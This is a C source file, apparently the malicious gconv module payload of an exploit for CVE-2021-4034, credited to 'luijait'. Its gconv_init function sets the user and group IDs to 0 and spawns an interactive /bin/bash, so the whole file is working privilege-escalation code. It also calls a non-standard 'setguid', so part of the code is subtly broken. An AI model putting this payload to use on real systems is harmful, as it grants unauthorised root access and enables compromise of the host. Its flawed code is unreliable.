#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
/**
 * @author: luijait
 * @version: 1.0
 * @CVE: CVE-2021-4034 
*/

//Perms
void perms(){
	setuid(0); 	//setresuid(0, 0, 0); 
	seteuid(0);	//setresgid(0, 0, 0);
	setgid(0); 
	setguid(0);
	
}
void gconv(void) {}


void gconv_init(void *step)
{
	
	perms();
	
	
	//Invoque Shell
	char * shell[] = { "/bin/bash", "-i", NULL };
	//Define Path
	char * env_vars[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
	execve(shell[0], shell, env_vars);
	exit(0); 
}
